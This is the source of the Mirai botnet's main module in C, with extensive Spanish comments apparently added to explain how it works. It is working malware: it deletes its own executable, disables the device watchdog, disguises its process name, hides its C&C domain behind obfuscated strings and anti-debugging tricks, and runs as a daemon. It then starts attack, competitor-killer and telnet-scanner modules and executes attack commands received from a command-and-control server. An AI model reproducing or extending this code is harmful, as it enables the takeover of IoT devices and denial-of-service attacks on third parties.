/**
 * @file main.c
 * @brief Módulo principal del bot Mirai
 * 
 * Este archivo implementa el punto de entrada principal y la lógica central del bot, incluyendo:
 * - Inicialización y configuración del bot
 * - Manejo de la conexión con el servidor C&C
 * - Protección contra depuración y análisis
 * - Administración del ciclo de vida del bot
 * - Comunicación y control de otros módulos
 */

#define _GNU_SOURCE  // Habilita características específicas de GNU/Linux

// Inclusiones del sistema
#ifdef DEBUG
#include <stdio.h>      // Para funciones de E/S en modo debug
#endif
#include <stdlib.h>     // Para funciones básicas del sistema
#include <unistd.h>     // Para fork(), execve()
#include <sys/socket.h> // Para funciones de red
#include <arpa/inet.h>  // Para estructuras de red
#include <sys/prctl.h> // Para control de procesos
#include <sys/select.h> // Para E/S multiplexada
#include <signal.h>    // Para manejo de señales
#include <fcntl.h>     // Para operaciones de archivo
#include <sys/ioctl.h> // Para control de dispositivos
#include <time.h>      // Para funciones de tiempo
#include <errno.h>     // Para códigos de error

// Inclusiones del proyecto
#include "includes.h"   // Definiciones comunes
#include "table.h"      // Tabla de cadenas ofuscadas
#include "rand.h"       // Generación de números aleatorios
#include "attack.h"     // Funcionalidad de ataque
#include "killer.h"     // Eliminación de otros malware
#include "scanner.h"    // Escaneo de objetivos
#include "util.h"       // Funciones de utilidad
#include "resolv.h"     // Resolución DNS

/**
 * @brief Manejador de señal para detección de depurador
 * @param sig Señal recibida
 */
static void anti_gdb_entry(int);

/**
 * @brief Resuelve la dirección IP del servidor C&C
 * Utiliza el dominio almacenado en la tabla ofuscada
 */
static void resolve_cnc_addr(void);

/**
 * @brief Establece una conexión con el servidor C&C
 * Configura un socket no bloqueante y inicia la conexión
 */
static void establish_connection(void);

/**
 * @brief Cierra la conexión con el servidor C&C
 * Libera recursos y espera antes de reconectar
 */
static void teardown_connection(void);

/**
 * @brief Asegura que solo una instancia del bot esté ejecutándose
 * Utiliza un puerto de control para detectar y eliminar otras instancias
 */
static void ensure_single_instance(void);

/**
 * @brief Desbloquea la tabla de cadenas si no hay depurador
 * @param argv0 Ruta del ejecutable
 * @return TRUE si la validación es exitosa
 */
static BOOL unlock_tbl_if_nodebug(char *);

// Variables globales
struct sockaddr_in srv_addr;          // Dirección del servidor C&C
int fd_ctrl = -1;                     // Socket de control para instancia única
int fd_serv = -1;                     // Socket de conexión al servidor C&C
BOOL pending_connection = FALSE;       // Indica si hay una conexión en progreso
// Función para resolver la dirección del C&C, inicialmente apunta a la dirección local
// Se sobrescribe en anti_gdb_entry para usar la resolución real
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
/**
 * @brief Manejador de señales de violación de segmento para depuración
 * 
 * @param sig Señal recibida (SIGSEGV o SIGBUS)
 * @param si Información detallada de la señal
 * @param unused No utilizado
 * 
 * Este manejador solo está disponible en modo DEBUG y proporciona
 * información sobre la dirección exacta donde ocurrió el fallo
 * de segmentación antes de terminar el proceso.
 */
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Se recibió SIGSEGV en la dirección: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

/**
 * @brief Punto de entrada principal del bot
 * 
 * @param argc Número de argumentos de línea de comandos
 * @param args Vector de argumentos, args[1] puede contener el ID del bot
 * @return int 0 en caso de éxito
 * 
 * Inicializa el bot realizando las siguientes tareas:
 * 1. Configuración de protecciones anti-análisis
 * 2. Ocultamiento del proceso
 * 3. Inicialización de módulos (ataque, killer, scanner)
 * 4. Establecimiento de conexión con C&C
 * 5. Bucle principal de procesamiento de comandos
 */
int main(int argc, char **args)
{
    // Variables para manejo de cadenas y nombres
    char *tbl_exec_succ;          // Mensaje de éxito de ejecución
    char name_buf[32];            // Buffer para nombres aleatorios
    char id_buf[32];              // Buffer para el ID del bot
    int name_buf_len;             // Longitud del nombre generado
    int tbl_exec_succ_len;        // Longitud del mensaje de éxito
    int pgid, pings = 0;          // ID de grupo de procesos y contador de pings

#ifndef DEBUG
    sigset_t sigs;           // Conjunto de señales a manejar
    int wfd;                 // Descriptor para el watchdog

    // Auto-eliminación del ejecutable para dificultar el análisis
    unlink(args[0]);

    // Configuración del control de flujo basado en señales
    // Esta sección implementa protecciones anti-análisis
    sigemptyset(&sigs);                          // Inicializa conjunto vacío
    sigaddset(&sigs, SIGINT);                    // Agrega SIGINT al conjunto
    sigprocmask(SIG_BLOCK, &sigs, NULL);         // Bloquea SIGINT
    signal(SIGCHLD, SIG_IGN);                    // Ignora señales de procesos hijo
    signal(SIGTRAP, &anti_gdb_entry);            // Detecta intentos de depuración

    // Previene que el watchdog reinicie el dispositivo
    // El watchdog es un mecanismo de seguridad que reinicia el sistema
    // si no recibe señales periódicas de que todo está funcionando bien
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||        // Intenta abrir watchdog principal
        (wfd = open("/dev/misc/watchdog", 2)) != -1)     // O watchdog alternativo
    {
        int one = 1;

        // Desactiva el watchdog usando ioctl
        // 0x80045704 es el código de operación para WDIOC_SETOPTIONS
        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    
    // Cambia al directorio raíz para evitar bloqueos de sistema de archivos
    chdir("/");
#endif

#ifdef DEBUG
    printf("MODO DEBUG ACTIVADO\n");

    sleep(1);  // Pequeña pausa para estabilización

    // Configura manejadores de señales para ayudar en la depuración
    struct sigaction sa;

    // Configura el manejador para SIGSEGV (Violación de Segmento)
    sa.sa_flags = SA_SIGINFO;          // Habilita información extendida de señal
    sigemptyset(&sa.sa_mask);          // No bloquea señales adicionales
    sa.sa_sigaction = segv_handler;    // Establece el manejador
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("Error al configurar manejador SIGSEGV");

    // Configura el manejador para SIGBUS (Error de Bus)
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("Error al configurar manejador SIGBUS");
#endif

    // Obtiene la dirección IP local del dispositivo
    LOCAL_ADDR = util_local_addr();

    // Configura la dirección inicial del servidor C&C
    // Inicialmente usa una dirección falsa que será actualizada más tarde
    srv_addr.sin_family = AF_INET;                 // Familia de direcciones IPv4
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;      // Dirección IP falsa inicial
    srv_addr.sin_port = htons(FAKE_CNC_PORT);      // Puerto en orden de red

#ifdef DEBUG
    // En modo debug, desbloquea la tabla directamente
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    // En modo producción, verifica la integridad y activa protección anti-depuración
    if (unlock_tbl_if_nodebug(args[0]))   // Si la validación es exitosa
        raise(SIGTRAP);                    // Activa la protección anti-depuración
#endif

    // Asegura que solo haya una instancia del bot ejecutándose
    ensure_single_instance();

    // Inicializa el generador de números aleatorios
    rand_init();

    // Inicializa y procesa el ID del bot
    util_zero(id_buf, 32);                        // Limpia el buffer de ID
    if (argc == 2 && util_strlen(args[1]) < 32)   // Si se proporcionó un ID válido
    {
        util_strcpy(id_buf, args[1]);             // Copia el ID proporcionado
        util_zero(args[1], util_strlen(args[1])); // Limpia el argumento por seguridad
    }

    // Oculta el nombre del proceso en argv[0]
    // Genera un nombre aleatorio para dificultar la detección
    name_buf_len = ((rand_next() % 4) + 3) * 4;   // Longitud aleatoria entre 12 y 24
    rand_alphastr(name_buf, name_buf_len);        // Genera cadena alfanumérica aleatoria
    name_buf[name_buf_len] = 0;                   // Asegura terminación null
    util_strcpy(args[0], name_buf);               // Reemplaza argv[0]

    // Oculta el nombre del proceso en la lista de procesos
    // Genera un nuevo nombre aleatorio diferente al usado en argv[0]
    name_buf_len = ((rand_next() % 6) + 3) * 4;   // Longitud aleatoria entre 12 y 32
    rand_alphastr(name_buf, name_buf_len);        // Genera cadena alfanumérica
    name_buf[name_buf_len] = 0;                   // Asegura terminación null
    prctl(PR_SET_NAME, name_buf);                 // Cambia el nombre visible del proceso

    // Imprime mensaje de éxito de ejecución
    // Este mensaje está ofuscado en la tabla de cadenas
    table_unlock_val(TABLE_EXEC_SUCCESS);          // Desbloquea la entrada en la tabla
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);  // Obtiene mensaje
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);  // Escribe mensaje
    write(STDOUT, "\n", 1);                           // Nueva línea
    table_lock_val(TABLE_EXEC_SUCCESS);               // Vuelve a bloquear la tabla

#ifndef DEBUG
    // Convierte el proceso en un demonio
    if (fork() > 0)              // El proceso padre termina
        return 0;
    pgid = setsid();             // Crea nueva sesión y grupo de procesos
    // Cierra los descriptores de archivo estándar
    close(STDIN);                // Cierra entrada estándar
    close(STDOUT);               // Cierra salida estándar
    close(STDERR);               // Cierra error estándar
#endif

    // Inicializa los módulos principales del bot
    attack_init();               // Inicializa el módulo de ataques
    killer_init();               // Inicializa el eliminador de otros malware
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();              // Inicializa el escáner de telnet si está habilitado
#endif
#endif

    // Bucle principal del bot
    // Este bucle maneja la comunicación con el servidor C&C y procesa comandos
    while (TRUE)
    {
        // Estructuras para select() - monitoreo de múltiples sockets
        fd_set fdsetrd;                  // Conjunto de descriptores para lectura
        fd_set fdsetwr;                  // Conjunto de descriptores para escritura
        struct timeval timeo;            // Estructura para timeout
        int mfd;                         // Descriptor máximo para select
        int nfds;                        // Número de descriptores listos

        // Inicializa los conjuntos de descriptores
        FD_ZERO(&fdsetrd);              // Limpia conjunto de lectura
        FD_ZERO(&fdsetwr);              // Limpia conjunto de escritura

        // Configura el socket de control para aceptar conexiones
        // Este socket se usa para detectar otras instancias del bot
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);    // Monitorea lecturas en socket de control

        // Gestión de la conexión con el servidor C&C
        if (fd_serv == -1)                // Si no hay conexión activa
            establish_connection();         // Intenta establecer una nueva conexión

        // Configura monitoreo del socket C&C según el estado
        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);    // Monitorea cuando se puede escribir (conexión en progreso)
        else
            FD_SET(fd_serv, &fdsetrd);    // Monitorea cuando hay datos para leer

        // Determina el descriptor de archivo más alto para select()
        // select() necesita el máximo + 1 como primer parámetro
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Configura el timeout para select()
        // Espera hasta 10 segundos por actividad en los sockets
        timeo.tv_usec = 0;                // 0 microsegundos
        timeo.tv_sec = 10;                // 10 segundos
        
        // Monitorea los sockets para actividad
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)                   // Error en select()
        {
#ifdef DEBUG
            printf("Error en select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)               // Timeout - sin actividad
        {
            uint16_t len = 0;             // Paquete vacío para ping

            // Envía un ping cada 60 segundos (cada 6 timeouts)
            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);  // Envía keepalive
        }

        // Verifica si hay que terminar el proceso
        // Esto ocurre cuando se detecta otra instancia del bot
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;      // Dirección del cliente
            socklen_t cli_addr_len = sizeof (cli_addr);

            // Acepta la conexión de la nueva instancia
            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] ¡Detectada nueva instancia en ejecución! Terminando proceso actual\n");
#endif
            // Limpieza ordenada antes de terminar
#ifdef MIRAI_TELNET
            scanner_kill();                   // Detiene el escáner de telnet
#endif
            killer_kill();                    // Detiene el killer
            attack_kill_all();                // Detiene todos los ataques
            kill(pgid * -1, 9);              // Mata todo el grupo de procesos
            exit(0);                          // Termina el proceso actual
        }

        // Maneja el resultado del intento de conexión al servidor C&C
        if (pending_connection)
        {
            pending_connection = FALSE;    // Marca la conexión como ya no pendiente

            // Verifica si el socket está listo para escribir
            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] Tiempo de espera agotado al conectar con C&C\n");
#endif
                teardown_connection();     // Limpia la conexión fallida
            }
            else
            {
                // Verifica si hubo error durante la conexión
                int err = 0;
                socklen_t err_len = sizeof (err);

                // Obtiene el estado del socket después de la conexión no bloqueante
                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                // Verifica si hubo error durante la conexión
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error al conectar con C&C código=%d\n", err);
#endif
                    close(fd_serv);                        // Cierra el socket
                    fd_serv = -1;                         // Marca como no conectado
                    sleep((rand_next() % 10) + 1);        // Espera aleatoria antes de reintentar
                }
                else  // Conexión exitosa
                {
                    uint8_t id_len = util_strlen(id_buf);  // Longitud del ID del bot

                    // Actualiza dirección local y envía datos de identificación
                    LOCAL_ADDR = util_local_addr();
                    // Envía protocolo mágico de identificación
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    // Envía longitud del ID
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    // Si hay ID, lo envía
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[main] Conectado a C&C. Dirección local = %d\n", LOCAL_ADDR);
#endif
                }
            }
        }
        // Procesa datos recibidos del servidor C&C
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;                     // Bytes leídos
            uint16_t len;             // Longitud del paquete
            char rdbuf[1024];         // Buffer de recepción

            // Intenta leer la longitud del buffer desde el C&C
            // Usa MSG_PEEK para no consumir los datos realmente
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)  // Error al leer
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;   // Errores no fatales, reintenta
                else
                    n = 0;     // Error fatal, fuerza cierre de conexión
            }
            
            // Si n == 0, la conexión se cerró desde el otro extremo
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Conexión perdida con C&C (errno = %d) 1\n", errno);
#endif
                teardown_connection();  // Limpia y cierra la conexión
                continue;              // Vuelve al inicio del bucle
            }

            // Procesa la longitud del paquete recibido
            if (len == 0) // Si es un ping (paquete vacío)
            {
                // Consume el paquete de longitud y continúa
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
                continue;
            }
            
            // Convierte la longitud a orden del host y verifica límites
            len = ntohs(len);  // Convierte de orden de red a orden del host
            if (len > sizeof (rdbuf))  // Si el paquete es demasiado grande
            {
                // Cierra la conexión por seguridad
                close(fd_serv);
                fd_serv = -1;
            }

            // Intenta leer el contenido del buffer desde el C&C
            // Primero verifica si los datos están disponibles usando MSG_PEEK
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)  // Error en la lectura
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;   // Error temporal, reintenta en el siguiente ciclo
                else
                    n = 0;     // Error fatal, fuerza cierre de conexión
            }

            // Si no se recibieron datos, la conexión se cerró
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Conexión perdida con C&C (errno = %d) 2\n", errno);
#endif
                teardown_connection();  // Limpia recursos de la conexión
                continue;              // Vuelve al inicio del bucle principal
            }

            // Lee los datos reales del buffer
            // Primero lee la longitud del mensaje
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);  // Convierte de orden de red a orden del host
            
            // Lee el contenido real del mensaje
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] Recibidos %d bytes del C&C\n", len);
#endif

            // Si hay datos válidos, los envía al parser de comandos de ataque
            if (len > 0)
                attack_parse(rdbuf, len);  // Procesa el comando de ataque recibido
        }
    }

    return 0;
}

/**
 * @brief Manejador de señal para la protección anti-depurador
 * 
 * @param sig Señal recibida (no utilizada)
 * 
 * Esta función se activa cuando se detecta un intento de depuración.
 * Cambia la función de resolución de dirección del C&C de la falsa
 * (util_local_addr) a la real (resolve_cnc_addr).
 */
static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;  // Activa la resolución real del C&C
}

/**
 * @brief Resuelve la dirección IP real del servidor C&C
 * 
 * Esta función:
 * 1. Obtiene el dominio del C&C de la tabla ofuscada
 * 2. Resuelve el dominio a una o más direcciones IP
 * 3. Selecciona una dirección IP aleatoria
 * 4. Configura el puerto del C&C
 * 
 * Se llama solo después de verificar que no hay depurador.
 */
static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;  // Estructura para almacenar las IPs resueltas

    // Obtiene y resuelve el dominio del C&C
    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] Error al resolver la dirección del C&C\n");
#endif
        return;
    }
    // Selecciona una IP aleatoria de las resueltas
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);  // Libera la memoria de las entradas

    // Configura el puerto del C&C desde la tabla ofuscada
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));  // Puerto en orden de red
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] Dominio resuelto exitosamente\n");
#endif
}

/**
 * @brief Establece una conexión con el servidor C&C
 * 
 * Esta función:
 * 1. Crea un socket TCP
 * 2. Lo configura como no bloqueante
 * 3. Resuelve la dirección del C&C
 * 4. Inicia la conexión asíncrona
 * 
 * La conexión se completa en el bucle principal cuando
 * el socket está listo para escribir.
 */
static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] Intentando conectar al C&C\n");
#endif

    // Crea un socket TCP IPv4
    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Error al crear socket(). Errno = %d\n", errno);
#endif
        return;
    }

    // Configura el socket como no bloqueante para conexión asíncrona
    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Resuelve la dirección real del C&C si estamos en modo seguro
    if (resolve_func != NULL)
        resolve_func();

    // Inicia la conexión asíncrona
    pending_connection = TRUE;  // Marca conexión como pendiente
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

/**
 * @brief Cierra y limpia la conexión con el servidor C&C
 * 
 * Esta función:
 * 1. Cierra el socket si está abierto
 * 2. Marca el descriptor como inválido
 * 3. Espera un segundo antes de permitir reconexión
 * 
 * Se llama cuando hay errores de conexión o cuando
 * el servidor cierra la conexión.
 */
static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] Cerrando conexión con el C&C!\n");
#endif

    // Cierra el socket si está abierto
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;             // Marca el socket como cerrado
    sleep(1);                 // Espera antes de reconectar
}

/**
 * @brief Asegura que solo una instancia del bot esté ejecutándose
 * 
 * Esta función implementa un mecanismo de bloqueo basado en socket para
 * garantizar que solo una instancia del bot se ejecute en el sistema.
 * Si detecta otra instancia:
 * 1. Intenta contactar a la instancia existente
 * 2. Espera que termine
 * 3. Si no responde, la termina forzadamente
 * 4. Toma el control como nueva instancia
 */
static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;         // Intenta primero bind local
    struct sockaddr_in addr;               // Estructura de dirección para el socket
    int opt = 1;                          // Opción para SO_REUSEADDR

    // Crea socket de control
    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    // Permite reutilizar la dirección inmediatamente
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    // Configura como no bloqueante
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    // Configura la dirección del socket de control
    addr.sin_family = AF_INET;
    // Intenta primero bind a localhost, si falla usa la IP local
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);  // Puerto específico para control

    // Intenta vincular el socket al puerto de control
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        // Si falla el bind a localhost, intenta con la IP local
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] ¡Otra instancia ya está en ejecución (errno = %d)! Enviando solicitud de terminación...\r\n", errno);
#endif

        // Reinicia la estructura de dirección por seguridad
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;        // Acepta cualquier dirección
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        // Intenta conectar con la instancia existente para notificar terminación
        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Error al conectar con fd_ctrl para solicitar terminación del proceso\n");
#endif
        }
        
        // Espera que la otra instancia termine y limpia
        sleep(5);                     // Espera 5 segundos
        close(fd_ctrl);               // Cierra el socket de control
        // Mata cualquier proceso que esté usando el puerto de control
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance();     // Reintenta para convertirnos en la instancia de control
    }
    else  // Bind exitoso, somos la única instancia
    {
        // Configura el socket para aceptar conexiones de otras instancias
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Error al llamar listen() en fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main] ¡Somos el único proceso en este sistema!\n");
#endif
    }
}

/**
 * @brief Desbloquea la tabla de cadenas si no hay depurador presente
 * 
 * @param argv0 Nombre del ejecutable
 * @return BOOL TRUE si la validación es exitosa, FALSE en caso contrario
 * 
 * Esta función implementa múltiples capas de protección anti-análisis:
 * 1. Ofuscación de cadenas críticas
 * 2. Validación del nombre del ejecutable
 * 3. Código señuelo y anti-descompilación
 * 4. Verificaciones de integridad
 */
static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // Cadena ofuscada que representa "./dvrHelper"
    // Dividida y reordenada para evitar detección de cadenas
    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 
                        0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, 
         buf_dst[12];  // Buffer para la cadena reconstruida
    int i, ii = 0, c = 0;          // Contadores e índices
    uint8_t fold = 0xAF;           // Valor inicial para cálculos de ofuscación
    // Array de punteros a funciones para ofuscación
    // Se usa para ocultar la verdadera función que queremos ejecutar
    void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,  // Señuelo 1
        (void (*) (void))table_unlock_val,       // Señuelo 2
        (void (*) (void))table_retrieve_val,     // Señuelo 3
        (void (*) (void))table_init,             // Función real que queremos ejecutar
        (void (*) (void))table_lock_val,         // Señuelo 4
        (void (*) (void))util_memcpy,            // Señuelo 5
        (void (*) (void))util_strcmp,            // Señuelo 6
        (void (*) (void))killer_init,            // Señuelo 7
        (void (*) (void))anti_gdb_entry          // Señuelo 8
    };
    BOOL matches;  // Resultado de la validación

    // Verificación de integridad de punteros a funciones
    // Suma los primeros 7 punteros como verificación anti-tampering
    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0)  // Si la suma es 0, algo está mal
        return FALSE;

    // Reconstruye la cadena original intercambiando bytes
    // Ejemplo: secuencia 1,2,3,4 se convierte en 2,1,4,3
    for (i = 0; i < sizeof (buf_src); i += 3)
    {
        char tmp = buf_src[i];        // Guarda temporalmente el primer byte

        // Intercambia los bytes y los coloca en el buffer destino
        buf_dst[ii++] = buf_src[i + 1];  // Segundo byte primero
        buf_dst[ii++] = tmp;              // Primer byte después

        // Código señuelo para confundir análisis estático
        // Las operaciones se cancelan entre sí: (i*2 + 14)/2 - 7 = i
        i *= 2;      // Multiplica por 2
        i += 14;     // Suma 14
        i /= 2;      // Divide por 2
        i -= 7;      // Resta 7 (volviendo al valor original)

        // Calcula índice de función a llamar basado en el nombre del ejecutable
        // Usa operaciones bit a bit para ofuscar el cálculo
        fold += ~argv0[ii % util_strlen(argv0)];  // Suma NOT de caracteres del nombre
    }
    // Normaliza el índice al tamaño del array de funciones
    fold %= (sizeof (obf_funcs) / sizeof (void *));
    
#ifndef DEBUG
    // En modo producción, realiza todas las verificaciones de seguridad
    (obf_funcs[fold])();                      // Llama a la función seleccionada
    matches = util_strcmp(argv0, buf_dst);     // Verifica nombre del ejecutable
    // Limpia buffers sensibles de la memoria
    util_zero(buf_src, sizeof (buf_src));      // Limpia buffer fuente
    util_zero(buf_dst, sizeof (buf_dst));      // Limpia buffer destino
    return matches;                            // Retorna resultado de validación
#else
    // En modo debug, inicializa la tabla directamente
    table_init();                              // Inicializa tabla de cadenas
    return TRUE;                               // Siempre exitoso en debug
#endif
}
